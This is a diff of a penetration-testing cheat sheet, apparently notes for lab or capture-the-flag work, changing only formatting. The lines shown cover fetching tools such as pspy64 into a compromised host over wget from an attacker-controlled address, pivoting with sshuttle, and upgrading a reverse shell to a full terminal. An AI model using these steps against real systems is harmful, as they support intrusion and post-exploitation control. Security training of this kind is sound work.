@@ -23,7 +23,7 @@ How to retrieve file(s) from host (inside a reverse shell)
 	1. Place file you want transferred in /var/www/html/
 	2. # service apache2 start
 	3. # wget http://10.10.10/pspy64 <- for single file
-  4. # wget -r http://10.10.10.10/pspy64/ <- for folder
+  	4. # wget -r http://10.10.10.10/pspy64/ <- for folder
 
 MSSQL
 ----------------
@@ -77,17 +77,17 @@ sshuttle -r user@10.10.10.10 10.1.1.0/24
 
 Shell Upgrading
 ----------------
-# In reverse shell
+- In reverse shell
 
 1. python -c 'import pty; pty.spawn("/bin/bash")'
 2. Ctrl-Z
 
-# In Kali
+- In Kali
 
 3. stty raw -echo
 4. fg
 
-# In reverse shell
+- In reverse shell
 5. reset (sometimes optional)
 6. export SHELL=bash
 7. export TERM=xterm-256color
